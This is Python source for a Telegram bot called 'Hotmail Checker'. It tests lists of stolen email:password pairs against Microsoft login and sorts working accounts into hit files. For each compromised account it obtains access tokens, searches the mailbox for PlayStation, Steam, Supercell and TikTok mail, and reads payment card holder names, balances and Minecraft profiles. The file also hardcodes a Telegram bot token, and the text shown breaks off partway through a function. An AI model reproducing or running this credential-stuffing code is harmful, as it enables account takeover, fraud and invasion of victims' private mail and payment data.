import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import json
import uuid
import re
import time
import os
import sys
from datetime import datetime
from pathlib import Path
from threading import Lock, Thread
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, unquote

ADMIN_ID = 7265489223
BOT_TOKEN = "8333811021:AAHR3R-Ns-cZytz1J-gCywl5TbFcaDAN_4o"
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

checking_active = False
current_check_thread = None
stats = None
result_mgr = None
combo_lines = []
stop_checking = False
current_message = None
threads_count = 10
selected_mode = "all"

CHECK_MODES = {
    "all": "ALL SERVICES",
    "microsoft": "MICROSOFT/XBOX",
    "psn": "PLAYSTATION",
    "steam": "STEAM",
    "supercell": "SUPERCELL",
    "tiktok": "TIKTOK",
    "minecraft": "MINECRAFT",
}

# Colors for terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    GRAY = '\033[90m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.CYAN}╔════════════════════════════════════════════════════════════╗
{Colors.CYAN}║{Colors.WHITE}              🔥 HOTMAIL CHECKER BOT 🔥                   {Colors.CYAN}║
{Colors.CYAN}║{Colors.GRAY}              Multi-Service Account Checker               {Colors.CYAN}║
{Colors.CYAN}╠════════════════════════════════════════════════════════════╣
{Colors.CYAN}║{Colors.YELLOW}  🎮 Xbox Game Pass  🎯 PSN  🎲 Steam  ⚔️ Supercell        {Colors.CYAN}║
{Colors.CYAN}║{Colors.MAGENTA}  📱 TikTok  ⛏️ Minecraft  💎 Microsoft 365              {Colors.CYAN}║
{Colors.CYAN}╚════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def print_terminal_status(stats):
    elapsed, cpm, progress = stats.get_progress()
    time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    
    sys.stdout.write('\033[2K\033[1G')
    status = f"""
{Colors.CYAN}┌──────────────────────────────────────────────────────┐
{Colors.CYAN}│{Colors.WHITE}              🔥 LIVE CHECKING STATUS 🔥               {Colors.CYAN}│
{Colors.CYAN}├──────────────────────────────────────────────────────┤
{Colors.CYAN}│{Colors.GREEN}  ✓ True: {stats.hits:<6}{Colors.RED}  ✗ Bad: {stats.bads:<6}{Colors.YELLOW}  🔐 2FA: {stats.twofa:<6}{Colors.CYAN}│
{Colors.CYAN}├──────────────────────────────────────────────────────┤
{Colors.CYAN}│{Colors.MAGENTA}  🎮 Xbox Free: {stats.xbox_free:<4}{Colors.MAGENTA}  🎮 Xbox Premium: {stats.xbox_premium:<4}{Colors.CYAN}│
{Colors.CYAN}│{Colors.BLUE}  🎯 PSN: {stats.psn_hits:<6}{Colors.CYAN}  🎲 Steam: {stats.steam_hits:<6}{Colors.CYAN}│
{Colors.CYAN}│{Colors.YELLOW}  ⚔️ Supercell: {stats.supercell_hits:<4}{Colors.MAGENTA}  📱 TikTok: {stats.tiktok_hits:<6}{Colors.CYAN}│
{Colors.CYAN}│{Colors.GREEN}  ⛏️ Minecraft: {stats.minecraft_hits:<4}{Colors.WHITE}  💎 Premium: {stats.premium:<6}{Colors.CYAN}│
{Colors.CYAN}├──────────────────────────────────────────────────────┤
{Colors.CYAN}│{Colors.WHITE}  📊 Progress: {progress:>5.1f}%  │  {stats.checked:>4}/{stats.total:<4}  │  ⚡ {cpm:>5.0f} CPM  │{Colors.CYAN}
{Colors.CYAN}├──────────────────────────────────────────────────────┤
{Colors.CYAN}│{Colors.YELLOW}  📧 Checking: {Colors.WHITE}{stats.current_email[:45]:<45}{Colors.CYAN}│
{Colors.CYAN}└──────────────────────────────────────────────────────┘{Colors.END}
"""
    print(status, end='\r')
    sys.stdout.flush()

def safe_edit_message(chat_id, message_id, text, reply_markup=None):
    try:
        bot.edit_message_text(
            text,
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=reply_markup
        )
        return True
    except Exception as e:
        if "message is not modified" not in str(e).lower():
            print(f"{Colors.RED}❌ Edit error: {e}{Colors.END}")
        return False

class ResultManager:
    def __init__(self, combo_filename):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = f"results/{timestamp}_{combo_filename}"
        Path(self.base_folder).mkdir(parents=True, exist_ok=True)
        
        self.hits_file = os.path.join(self.base_folder, "Hits.txt")
        self.twofa_file = os.path.join(self.base_folder, "2FA.txt")
        self.bad_file = os.path.join(self.base_folder, "Bad.txt")
        self.premium_file = os.path.join(self.base_folder, "Premium.txt")
        self.xbox_file = os.path.join(self.base_folder, "Xbox_GamePass.txt")
        self.psn_file = os.path.join(self.base_folder, "PSN_Hits.txt")
        self.steam_file = os.path.join(self.base_folder, "Steam_Hits.txt")
        self.supercell_file = os.path.join(self.base_folder, "Supercell_Hits.txt")
        self.tiktok_file = os.path.join(self.base_folder, "TikTok_Hits.txt")
        self.minecraft_file = os.path.join(self.base_folder, "Minecraft_Hits.txt")
        self.all_file = os.path.join(self.base_folder, "All_Results.txt")
        
        files = [self.hits_file, self.twofa_file, self.bad_file, self.premium_file,
                self.xbox_file, self.psn_file, self.steam_file, self.supercell_file,
                self.tiktok_file, self.minecraft_file, self.all_file]
        
        for file_path in files:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(f"# Hotmail Checker Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    
    def format_subscriptions(self, subscriptions):
        """Format subscription names for display"""
        if not subscriptions:
            return ""
        
        formatted = []
        for sub in subscriptions:
            name = sub.get('name', '')
            # Format nicely
            if "GAME PASS ULTIMATE" in name:
                formatted.append("GAME PASS ULTIMATE")
            elif "PC GAME PASS" in name:
                formatted.append("PC GAME PASS")
            elif "GAME PASS" in name and "ULTIMATE" not in name and "PC" not in name:
                formatted.append("GAME PASS")
            elif "M365 FAMILY" in name or "Microsoft 365 Family" in name:
                formatted.append("M365 FAMILY")
            elif "M365 PERSONAL" in name or "Microsoft 365 Personal" in name:
                formatted.append("M365 PERSONAL")
            elif "OFFICE 365" in name:
                formatted.append("OFFICE 365")
            elif "EA PLAY" in name:
                formatted.append("EA PLAY")
            elif "XBOX LIVE GOLD" in name:
                formatted.append("XBOX LIVE GOLD")
            else:
                formatted.append(name)
        
        return " | ".join(formatted)
    
    def save_result(self, email, password, status, result_data=None):
        line = f"{email}:{password}"
        
        with open(self.all_file, 'a', encoding='utf-8') as f:
            details = []
            if result_data:
                if result_data.get('subscriptions'):
                    subs = self.format_subscriptions(result_data['subscriptions'])
                    if subs:
                        details.append(subs)
                if result_data.get('psn_orders', 0) > 0:
                    details.append(f"Orders: {result_data['psn_orders']}")
                if result_data.get('steam_count', 0) > 0:
                    details.append(f"Games: {result_data['steam_count']}")
                if result_data.get('supercell_games'):
                    games = ', '.join(result_data['supercell_games'])
                    details.append(games)
                if result_data.get('tiktok_username'):
                    details.append(f"@{result_data['tiktok_username']}")
                if result_data.get('minecraft_username'):
                    details.append(result_data['minecraft_username'])
            
            if details:
                f.write(f"{line} | {' | '.join(details)}\n")
            else:
                f.write(f"{line}\n")
        
        if status == "HIT":
            with open(self.hits_file, 'a', encoding='utf-8') as f:
                f.write(f"{line}\n")
            
            if result_data:
                # Save to Xbox file
                if result_data.get('subscriptions'):
                    with open(self.xbox_file, 'a', encoding='utf-8') as f:
                        subs = self.format_subscriptions(result_data['subscriptions'])
                        f.write(f"{line} | {subs}\n")
                    
                    # Save to Premium file if active
                    active_subs = [s for s in result_data['subscriptions'] if not s.get('is_expired', False)]
                    if active_subs:
                        with open(self.premium_file, 'a', encoding='utf-8') as f:
                            subs = self.format_subscriptions(active_subs)
                            f.write(f"{line} | {subs}\n")
                
                # Save to PSN file
                if result_data.get('psn_orders', 0) > 0:
                    with open(self.psn_file, 'a', encoding='utf-8') as f:
                        f.write(f"{line} | Orders: {result_data['psn_orders']}\n")
                
                # Save to Steam file
                if result_data.get('steam_count', 0) > 0:
                    with open(self.steam_file, 'a', encoding='utf-8') as f:
                        f.write(f"{line} | Games: {result_data['steam_count']}\n")
                
                # Save to Supercell file
                if result_data.get('supercell_games'):
                    with open(self.supercell_file, 'a', encoding='utf-8') as f:
                        games = ', '.join(result_data['supercell_games'])
                        f.write(f"{line} | {games}\n")
                
                # Save to TikTok file
                if result_data.get('tiktok_username'):
                    with open(self.tiktok_file, 'a', encoding='utf-8') as f:
                        f.write(f"{line} | @{result_data['tiktok_username']}\n")
                
                # Save to Minecraft file
                if result_data.get('minecraft_username'):
                    with open(self.minecraft_file, 'a', encoding='utf-8') as f:
                        f.write(f"{line} | {result_data['minecraft_username']}\n")
        
        elif status == "2FA":
            with open(self.twofa_file, 'a', encoding='utf-8') as f:
                f.write(f"{line}\n")
        elif status == "BAD":
            with open(self.bad_file, 'a', encoding='utf-8') as f:
                f.write(f"{line}\n")
    
    def get_files_with_content(self):
        files = []
        file_list = [self.hits_file, self.twofa_file, self.premium_file, self.xbox_file,
                    self.psn_file, self.steam_file, self.supercell_file, self.tiktok_file,
                    self.minecraft_file, self.all_file]
        
        for file_path in file_list:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    content_lines = [l for l in lines if l.strip() and not l.startswith('#')]
                    if content_lines:
                        files.append(file_path)
        return files

class LiveStats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.bads = 0
        self.twofa = 0
        self.premium = 0
        self.xbox_free = 0
        self.xbox_premium = 0
        self.psn_hits = 0
        self.steam_hits = 0
        self.supercell_hits = 0
        self.tiktok_hits = 0
        self.minecraft_hits = 0
        self.start_time = time.time()
        self.lock = Lock()
        self.current_email = ""
        self.last_update_time = 0
    
    def update(self, status, result_data=None):
        with self.lock:
            self.checked += 1
            if status == "HIT":
                self.hits += 1
                if result_data:
                    ms_status = result_data.get("ms_status")
                    subscriptions = result_data.get("subscriptions", [])

                    if ms_status in ("FREE", "PREMIUM") or subscriptions:
                        active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
                        if ms_status == "PREMIUM" or active_subs:
                            self.premium += 1
                            self.xbox_premium += 1
                        else:
                            self.xbox_free += 1

                    if result_data.get('psn_orders', 0) > 0:
                        self.psn_hits += 1
                    if result_data.get('steam_count', 0) > 0:
                        self.steam_hits += 1
                    if result_data.get('supercell_games'):
                        self.supercell_hits += 1
                    if result_data.get('tiktok_username'):
                        self.tiktok_hits += 1
                    if result_data.get('minecraft_username'):
                        self.minecraft_hits += 1
            elif status == "2FA":
                self.twofa += 1
            else:
                self.bads += 1
    
    def set_current(self, email):
        with self.lock:
            self.current_email = email
    
    def get_progress(self):
        elapsed = time.time() - self.start_time
        cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
        progress = (self.checked / self.total * 100) if self.total > 0 else 0
        return elapsed, cpm, progress
    
    def should_update_telegram(self):
        with self.lock:
            current_time = time.time()
            if current_time - self.last_update_time >= 1 or self.checked == self.total:
                self.last_update_time = current_time
                return True
            return False

class HotmailChecker:
    def __init__(self, check_mode="all"):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.check_mode = check_mode
        
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def check_microsoft_subscriptions(self, access_token, cid):
        """Check Xbox, Microsoft 365, and other Microsoft subscriptions."""
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            
            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=True, timeout=20)
            payment_token = None
            search_text = r.text + " " + r.url
            
            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            sub_data = {}
            subscriptions = []
            
            if payment_token:
                payment_headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json",
                    "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                    "Content-Type": "application/json",
                    "Host": "paymentinstruments.mp.microsoft.com",
                    "ms-cV": str(uuid.uuid4()),
                    "Origin": "https://account.microsoft.com",
                    "Referer": "https://account.microsoft.com/"
                }
                
                try:
                    payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                    r_pay = self.session.get(payment_url, headers=payment_headers, timeout=15)
                    if r_pay.status_code == 200:
                        balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
                        if balance_match:
                            sub_data['balance'] = "$" + balance_match.group(1)
                        card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r_pay.text, re.DOTALL)
                        if card_match:
                            sub_data['card_holder'] = card_match.group(1)
                except:
                    pass
                
                try:
                    rewards_r = self.session.get("https://rewards.bing.com/", timeout=10)
                    points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                    if points_match:
                        sub_data['rewards_points'] = points_match.group(1)
                except:
                    pass
                
                try:
                    trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                    r_sub = self.session.get(trans_url, headers=payment_headers, timeout=15)
                    
                    if r_sub.status_code == 200:
                        response_text = r_sub.text
                        subscription_keywords = {
                            'Xbox Game Pass Ultimate': {'type': 'GAME PASS ULTIMATE', 'category': 'gaming'},
                            'PC Game Pass': {'type': 'PC GAME PASS', 'category': 'gaming'},
                            'Xbox Game Pass': {'type': 'GAME PASS', 'category': 'gaming'},
                            'EA Play': {'type': 'EA PLAY', 'category': 'gaming'},
                            'Xbox Live Gold': {'type': 'XBOX LIVE GOLD', 'category': 'gaming'},
                            'Microsoft 365 Family': {'type': 'M365 FAMILY', 'category': 'office'},
                            'Microsoft 365 Personal': {'type': 'M365 PERSONAL', 'category': 'office'},
                            'Office 365': {'type': 'OFFICE 365', 'category': 'office'},
                            'OneDrive': {'type': 'ONEDRIVE', 'category': 'storage'},
                        }
                        
                        for keyword, info in subscription_keywords.items():
                            if keyword in response_text:
                                sub_info = {
                                    'name': info['type'],
                                    'category': info['category']
                                }
                                
                                renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                                if renewal_match:
                                    renewal_date = renewal_match.group(1)
                                    sub_info['renewal_date'] = renewal_date
                                    sub_info['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")
                                    try:
                                        if int(sub_info['days_remaining']) < 0:
                                            sub_info['is_expired'] = True
                                    except:
                                        pass
                                
                                subscriptions.append(sub_info)
                except:
                    pass
            active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
            return {
                "status": "PREMIUM" if active_subs else "FREE",
                "subscriptions": subscriptions,
                "data": sub_data
            }
            
        except Exception as e:
            return {"status": "ERROR", "subscriptions": [], "data": {}}
    
    def check_psn(self, access_token, cid):
        """Check PlayStation Network orders - Exact copy from API"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            
            if r.status_code == 200:
                data = r.json()
                total_orders = 0
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)
                
                return total_orders
            return 0
            
        except Exception as e:
            return 0
    
    def check_steam(self, access_token, cid):
        """Check Steam purchases - Exact copy from API"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "noreply@steampowered.com OR steam"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            
            if r.status_code == 200:
                data = r.json()
                total_count = 0
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_count = result_set.get('Total', 0)
                
                return total_count
            return 0
            
        except Exception as e:
            return 0
    
    def check_supercell(self, access_token, cid):
        """Check Supercell games - Exact copy from API"""
        try:
            games = ["Clash of Clans", "Clash Royale", "Brawl Stars", "Hay Day", "Boom Beach"]
            found_games = []
            
            for game in games:
                try:
                    search_url = "https://outlook.live.com/search/api/v2/query"
                    payload = {
                        "Cvid": str(uuid.uuid4()),
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "UTC",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                            "From": 0,
                            "Query": {"QueryString": game},
                            "Size": 5,
                            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                        }]
                    }
                    
                    headers = {
                        'Authorization': f'Bearer {access_token}',
                        'X-AnchorMailbox': f'CID:{cid}',
                        'Content-Type': 'application/json'
                    }
                    
                    r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
                    
                    if r.status_code == 200:
                        data = r.json()
                        if 'EntitySets' in data:
                            for entity_set in data['EntitySets']:
                                if 'ResultSets' in entity_set:
                                    for result_set in entity_set['ResultSets']:
                                        total = result_set.get('Total', 0)
                                        if total > 0:
                                            found_games.append(game)
                                            break
                    time.sleep(0.2)
                except:
                    continue
            
            return found_games
            
        except Exception as e:
            return []
    
    def check_tiktok(self, access_token, cid):
        """Check TikTok account - Exact copy from API"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "TikTok OR tiktok.com"},
                    "Size": 10,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                username = None
                
                if 'EntitySets' in data:
                    for entity_set in data['EntitySets']:
                        if 'ResultSets' in entity_set:
                            for result_set in entity_set['ResultSets']:
                                if 'Results' in result_set:
                                    for result in result_set['Results'][:3]:
                                        preview = result.get('Preview', '')
                                        username_match = re.search(r'@([a-zA-Z0-9_.]{2,24})', preview)
                                        if username_match:
                                            username = username_match.group(1)
                                            return username
            return None
            
        except Exception as e:
            return None
    
    def check_minecraft(self, access_token):
        """Check Minecraft account - Exact copy from API"""
        try:
            r = self.session.get(
                "https://api.minecraftservices.com/minecraft/profile",
                headers={"Authorization": f"Bearer {access_token}"},
                timeout=10
            )
            
            if r.status_code == 200:
                data = r.json()
                return data.get('name')
            return None
            
        except Exception as e:
            return None
    
    def parse_combo_line(self, line):
        """Parse combo line in any format"""
        line = line.strip()
        if not line or line.startswith('https://'):
            return None
        
        # Handle email:password format
        if ':' in line:
            parts = line.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            
            # Clean password if it has extra data
            if '|' in password:
                password = password.split('|')[0].strip()
            if ' ' in password:
                password = password.split(' ')[0].strip()
            
            if '@' in email and any(domain in email.lower() for domain in ['hotmail', 'outlook', 'live']):
                return email, password
        
        return None
    
    def check(self, email, password):
        """Main check function - Exact copy from API"""
        try:
            # Step 1: Get IDP
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}
            
            time.sleep(0.3)
            
            # Step 2: Authorize
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 3: Login
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            response_text = r3.text.lower()
            
            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
                return {"status": "BAD"}
            
            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
                return {"status": "2FA"}
            
            if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
                return {"status": "2FA"}
            
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BAD"}
            
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            
            code = code_match.group(1)
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD"}
            
            cid = mspcid.upper()
            
            # Step 4: Get token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                   data=token_data, 
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=15)
            
            if "access_token" not in r4.text:
                return {"status": "BAD"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            result = {
                "status": "HIT",
                "email": email,
                "password": password
            }

            if self.check_mode in ["microsoft", "all"]:
                ms_result = self.check_microsoft_subscriptions(access_token, cid)
                result["ms_status"] = ms_result.get("status", "FREE")
                result["subscriptions"] = ms_result.get("subscriptions", [])
                result["ms_data"] = ms_result.get("data", {})
            else:
                result["ms_status"] = "SKIPPED"
                result["subscriptions"] = []
                result["ms_data"] = {}

            if self.check_mode in ["psn", "all"]:
                result["psn_orders"] = self.check_psn(access_token, cid)
            else:
                result["psn_orders"] = 0

            if self.check_mode in ["steam", "all"]:
                result["steam_count"] = self.check_steam(access_token, cid)
            else:
                result["steam_count"] = 0

            if self.check_mode in ["supercell", "all"]:
                result["supercell_games"] = self.check_supercell(access_token, cid)
            else:
                result["supercell_games"] = []

            if self.check_mode in ["tiktok", "all"]:
                result["tiktok_username"] = self.check_tiktok(access_token, cid)
            else:
                result["tiktok_username"] = None

            if self.check_mode in ["minecraft", "all"]:
                result["minecraft_username"] = self.check_minecraft(access_token)
            else:
                result["minecraft_username"] = None
            
            return result
            
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except Exception as e:
            return {"status": "ERROR"}

def generate_status_message(stats, mode_label):
    elapsed, cpm, progress = stats.get_progress()
    time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    hit_rate = (stats.hits / stats.checked * 100) if stats.checked else 0
    
    unique_id = int(time.time() * 1000) % 10000
    
    message = f"""
<b>🔥 HOTMAIL CHECKER 🔥</b>
━━━━━━━━━━━━━━━━━━━━━━━
<b>Status:</b> 🟢 CHECKING...
<b>Mode:</b> {mode_label}

<b>✓ True:</b> {stats.hits}
<b>✗ Bad:</b> {stats.bads}
<b>🔐 2FA:</b> {stats.twofa}
<b>🎯 Hit Rate:</b> {hit_rate:.1f}%
━━━━━━━━━━━━━━━━━━━━━━━
<b>🎮 Xbox Free:</b> {stats.xbox_free}
<b>🎮 Xbox Premium:</b> {stats.xbox_premium}
<b>💎 Premium:</b> {stats.premium}
<b>🎯 PSN:</b> {stats.psn_hits}
<b>🎲 Steam:</b> {stats.steam_hits}
<b>⚔️ Supercell:</b> {stats.supercell_hits}
<b>📱 TikTok:</b> {stats.tiktok_hits}
<b>⛏️ Minecraft:</b> {stats.minecraft_hits}
━━━━━━━━━━━━━━━━━━━━━━━
<b>📊 Progress:</b> {progress:.1f}% | {stats.checked}/{stats.total}
<b>⚡ Speed:</b> {cpm:.0f} CPM | ⏱️ {time_str}
━━━━━━━━━━━━━━━━━━━━━━━
<b>📧 Checking:</b>
<code>{stats.current_email[:50]}</code>
━━━━━━━━━━━━━━━━━━━━━━━
<code>⏱️ {unique_id}</code>
"""
    return message


def generate_quick_summary(stats, total_lines, mode_label):
    elapsed, cpm, _ = stats.get_progress()
    time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    return f"""
<b>📌 QUICK SUMMARY</b>
━━━━━━━━━━━━━━━━━━━━━━━
<b>Mode:</b> {mode_label}
<b>✓ True:</b> {stats.hits}
<b>🔐 2FA:</b> {stats.twofa}
<b>✗ Bad:</b> {stats.bads}
<b>🎮 Xbox Premium:</b> {stats.xbox_premium}
<b>🎯 PSN:</b> {stats.psn_hits}
<b>🎲 Steam:</b> {stats.steam_hits}
<b>⚔️ Supercell:</b> {stats.supercell_hits}
<b>📱 TikTok:</b> {stats.tiktok_hits}
